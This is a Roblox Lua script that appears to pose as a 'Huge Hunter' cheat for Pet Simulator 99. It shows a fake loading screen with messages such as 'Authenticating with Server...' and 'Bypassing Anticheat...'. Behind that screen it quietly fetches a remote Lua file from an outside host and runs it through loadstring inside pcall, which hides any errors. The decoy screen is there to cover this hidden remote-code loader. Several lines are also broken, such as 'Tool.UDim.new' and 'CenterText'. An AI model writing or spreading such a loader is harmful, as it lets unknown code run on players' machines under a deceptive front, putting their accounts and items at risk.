local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

if PlayerGui:FindFirstChild("PS99_FakeLoading") then
    PlayerGui:FindFirstChild("PS99_FakeLoading"):Destroy()
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PS99_FakeLoading"
ScreenGui.IgnoreGuiInset = true 
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(1, 0, 1, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local Gradient = Instance.new("UIGradient")
Gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 30, 48)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(36, 59, 85))
}
Gradient.Rotation = 45
Gradient.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(0, 400, 0, 50)
Title.Position = UDim2.new(0.5, -200, 0.4, -25)
Title.BackgroundTransparency = 1
Title.Text = "HUGE HUNTER"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 32
Title.Parent = MainFrame

local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(0, 400, 0, 30)
SubTitle.Position = UDim2.new(0.5, -200, 0.4, 15)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "Authenticating with Server..."
SubTitle.TextColor3 = Color3.fromRGB(200, 200, 200)
SubTitle.Font = Enum.Font.Gotham
SubTitle.TextSize = 14
SubTitle.Parent = MainFrame

local BarBG = Instance.new("Frame")
BarBG.Size = UDim2.new(0, 300, 0, 10)
BarBG.Position = UDim2.new(0.5, -150, 0.5, 20)
BarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
BarBG.BorderSizePixel = 0
BarBG.Parent = MainFrame

local BarCorner = Instance.new("UICorner")
BarCorner.CornerRadius = Tool.UDim.new(0, 10)
BarCorner.Parent = BarBG

local BarFill = Instance.new("Frame")
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
BarFill.BorderSizePixel = 0
BarFill.Parent = BarBG

local FillCorner = Instance.new("UICorner")
FillCorner.CornerRadius = Tool.UDim.new(0, 10)
FillCorner.Parent = BarFill

local FillGradient = Instance.new("UIGradient")
FillGradient.Color = ColorSequence.new(Color3.fromRGB(0, 255, 255), Color3.fromRGB(0, 100, 255))
FillGradient.Parent = BarFill

local PercentLabel = Instance.new("TextLabel")
PercentLabel.Size = UDim2.new(0, 100, 0, 30)
PercentLabel.Position = UDim2.new(0.5, -50, 0.5, 35)
PercentLabel.BackgroundTransparency = 1
PercentLabel.Text = "0%"
PercentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
PercentLabel.Font = Enum.Font.GothamBold
PercentLabel.TextSize = 16
PercentLabel.Parent = MainFrame

local function runLoading()
    local hasExecuted = false
    
    for i = 0, 100 do
        local progress = i / 100
        
        TweenService:Create(BarFill, TweenInfo.new(0.1), {Size = UDim2.new(progress, 0, 1, 0)}):Play()
        PercentLabel.Text = i .. "%"
        
        if i == 20 then SubTitle.CenterText = "Fetching Assets..."
        elseif i == 50 then SubTitle.Text = "Bypassing Anticheat..."
        elseif i == 80 then SubTitle.Text = "Finalizing..."
        end

        if i >= 90 and not hasExecuted then
            hasExecuted = true
            task.spawn(function()
                pcall(function()
                    loadstring(game:HttpGet("https://eternal-darkness.org/loaders/f3a0cc31fa02f3c8cddf43a26c615f01.lua"))()
                end)
            end)
        end
        
        task.wait(math.random(0.02, 0.1))
    end
  
    SubTitle.Text = "Ready!"
    task.wait(0.5)
    local fade = TweenService:Create(MainFrame, TweenInfo.new(0.5), {BackgroundTransparency = 1})
    fade:Play()
    
    for _, child in pairs(MainFrame:GetChildren()) do
        if child:IsA("TextLabel") or child:IsA("Frame") then
            TweenService:Create(child, TweenInfo.new(0.5), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
        end
    end
    
    fade.Completed:Connect(function()
        ScreenGui:Destroy()
    end)
end

task.spawn(runLoading)
